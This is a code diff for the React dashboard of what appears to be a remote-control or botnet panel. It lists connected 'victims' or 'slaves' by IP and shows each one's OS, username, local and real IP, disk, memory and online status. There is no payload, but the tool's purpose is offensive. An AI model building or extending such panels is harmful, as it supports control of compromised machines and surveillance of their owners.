@@ -38248,10 +38248,10 @@ var Body = function (_React$Component) {
                 clientY: 0
             },
             ServerConstants: null,
-            ConnectedGuests: {}
+            ConnectedGuests: {},
+            RenderGuests: false
         };
 
-        _this.getVictims();
         return _this;
     }
 
@@ -38269,7 +38269,10 @@ var Body = function (_React$Component) {
                     console.log("slaves:", slaves, "Constants:", ServerConstants);
                     var ConnectedGuests = _this2.state.ConnectedGuests;
                     ConnectedGuests = slaves;
-                    _this2.setState({ ConnectedGuests: ConnectedGuests });
+                    var RenderGuests = _this2.state.RenderGuests;
+                    if (RenderGuests === false) RenderGuests = true;
+
+                    _this2.setState({ ConnectedGuests: ConnectedGuests, RenderGuests: RenderGuests });
                 };
                 // intial data pull
                 _this2.ServerStore({
@@ -38436,22 +38439,48 @@ var Body = function (_React$Component) {
             alert("clicked");
         }
     }, {
+        key: "componentDidMount",
+        value: function componentDidMount() {
+            this.getVictims();
+        }
+    }, {
         key: "render",
         value: function render() {
             var _this3 = this;
 
             var currentOption = this.currentOption();
-            console.log("Constants:", this.state.ServerConstants);
-            var viewVictims = function viewVictims() {
-                var re = [];
-                for (var ip in _this3.state.ConnectedGuests) {
-                    re.push(_react2.default.createElement(_vicBox2.default, { key: ip,
-                        ContextHandler: function ContextHandler(event) {
-                            return _this3.handleContext(event, 1);
-                        },
-                        Text: ip, Attributes: {}, info: _this3.state.ConnectedGuests[ip] }));
+            var rend = function rend() {
+                var r = [_react2.default.createElement(
+                    "h3",
+                    { key: "noVics" },
+                    " No Slaves Was Found :( "
+                )];
+                if (Object.keys(_this3.state.ConnectedGuests).length > 0) {
+                    r.splice(0, 1);
+                    for (var ip in _this3.state.ConnectedGuests) {
+                        if (_this3.state.ConnectedGuests[ip].data != null) {
+                            if (_this3.state.ServerConstants.hideOfflineSlaves == true && _this3.state.ConnectedGuests[ip].status == 0) continue;
+
+                            r.push(_react2.default.createElement(_vicBox2.default, { key: ip,
+                                ContextHandler: function ContextHandler(event) {
+                                    return _this3.handleContext(event, 1);
+                                },
+                                Text: ip, Attributes: {}, info: _this3.state.ConnectedGuests[ip] }));
+                        } else if (r.length == 0) {
+                            r.push(_react2.default.createElement(
+                                "div",
+                                { key: "loadingParent" },
+                                _react2.default.createElement("i", { className: "fa fa-cog fa-spin fa-3x fa-fw", key: "loadingIcon" }),
+                                _react2.default.createElement(
+                                    "span",
+                                    { key: "loadingText", style: { "fontSize": "2em" } },
+                                    " Loading Victim ..."
+                                )
+                            ));
+                        }
+                    }
                 }
-                return re;
+                return r;
             };
             return _react2.default.createElement(
                 "div",
@@ -38459,11 +38488,7 @@ var Body = function (_React$Component) {
                 this.state.ContextMenu.renderContext ? _react2.default.createElement(_contextmenu2.default, {
                     pos: { clientX: this.state.ContextMenu.clientX, clientY: this.state.ContextMenu.clientY },
                     srcElm: this.ContextElement, options: currentOption }) : null,
-                Object.keys(this.state.ConnectedGuests).length > 0 ? viewVictims() : _react2.default.createElement(
-                    "h1",
-                    null,
-                    "No Guests "
-                )
+                this.state.RenderGuests ? rend() : "<i style=\"fa fa-cog fa-spin fa-fw\"></i> <span> Loading Configuration ... </span>"
             );
         }
     }]);
@@ -38598,6 +38623,7 @@ var vicBox = function (_React$Component) {
         var _this = _possibleConstructorReturn(this, (vicBox.__proto__ || Object.getPrototypeOf(vicBox)).call(this, props));
 
         _this.state = props;
+        console.log("state", _this.state);
         return _this;
     }
 
@@ -38639,15 +38665,125 @@ var vicBox = function (_React$Component) {
     }, {
         key: "render",
         value: function render() {
+            var _this2 = this;
+
+            var r = function r() {
+                if (true) {
+                    return _react2.default.createElement(
+                        "div",
+                        null,
+                        _react2.default.createElement(
+                            "div",
+                            _this2.setAttributes(),
+                            _react2.default.createElement(
+                                "div",
+                                { className: "info" },
+                                _react2.default.createElement(
+                                    "div",
+                                    { className: "col name" },
+                                    _this2.state.Text
+                                ),
+                                _react2.default.createElement(
+                                    "div",
+                                    { className: "col" },
+                                    _react2.default.createElement(
+                                        "div",
+                                        null,
+                                        _react2.default.createElement("i", { className: "fa fa-hdd-o" }),
+                                        _react2.default.createElement(
+                                            "span",
+                                            null,
+                                            _this2.state.info.data.os.hdd.used,
+                                            "/",
+                                            _this2.state.info.data.os.hdd.total,
+                                            " ",
+                                            _this2.state.info.data.os.hdd.unit
+                                        )
+                                    ),
+                                    _react2.default.createElement(
+                                        "div",
+                                        null,
+                                        _react2.default.createElement("i", { className: "fa fa-microchip" }),
+                                        _react2.default.createElement(
+                                            "span",
+                                            null,
+                                            _this2.state.info.data.os.memory.used,
+                                            "/",
+                                            _this2.state.info.data.os.memory.total,
+                                            " ",
+                                            _this2.state.info.data.os.memory.unit
+                                        )
+                                    )
+                                ),
+                                _react2.default.createElement(
+                                    "div",
+                                    { className: "col" },
+                                    _react2.default.createElement(
+                                        "div",
+                                        null,
+                                        _react2.default.createElement("i", { className: "fa fa-podcast" }),
+                                        _react2.default.createElement(
+                                            "span",
+                                            null,
+                                            _this2.state.info.data.os.localIPAddress,
+                                            " ",
+                                            _react2.default.createElement("br", null),
+                                            " ",
+                                            _this2.state.info.realIP
+                                        )
+                                    ),
+                                    _react2.default.createElement(
+                                        "div",
+                                        null,
+                                        _react2.default.createElement("i", { className: "fa fa-tasks" }),
+                                        _react2.default.createElement(
+                                            "span",
+                                            null,
+                                            _this2.state.info.data.os.processor
+                                        )
+                                    )
+                                ),
+                                _react2.default.createElement(
+                                    "div",
+                                    { className: "col" },
+                                    _react2.default.createElement(
+                                        "div",
+                                        null,
+                                        _react2.default.createElement("i", { className: "fa fa-desktop" }),
+                                        _react2.default.createElement(
+                                            "span",
+                                            null,
+                                            _this2.state.info.data.os.name
+                                        )
+                                    ),
+                                    _react2.default.createElement(
+                                        "div",
+                                        null,
+                                        _react2.default.createElement("i", { className: "fa fa-user" }),
+                                        _react2.default.createElement(
+                                            "span",
+                                            null,
+                                            _this2.state.info.data.os.username
+                                        )
+                                    )
+                                )
+                            )
+                        ),
+                        _react2.default.createElement("span", { className: _this2.props.info.status == 1 ? "status online" : "status offline" }),
+                        _react2.default.createElement("img", { src: "http://lorempixel.com/60/60/", className: "screen-preview" })
+                    );
+                } else {
+                    return _react2.default.createElement(
+                        "div",
+                        null,
+                        "Someone is connecting"
+                    );
+                }
+            };
             return _react2.default.createElement(
                 "div",
                 { className: "vic-box z-depth-5", onContextMenu: this.state.ContextHandler || null },
-                _react2.default.createElement(
-                    "div",
-                    this.setAttributes(),
-                    this.state.Text + (" - status: " + this.props.info.status) || ""
-                ),
-                _react2.default.createElement("img", { src: "http://lorempixel.com/60/60/", className: "screen-preview" })
+                r()
             );
         }
     }]);
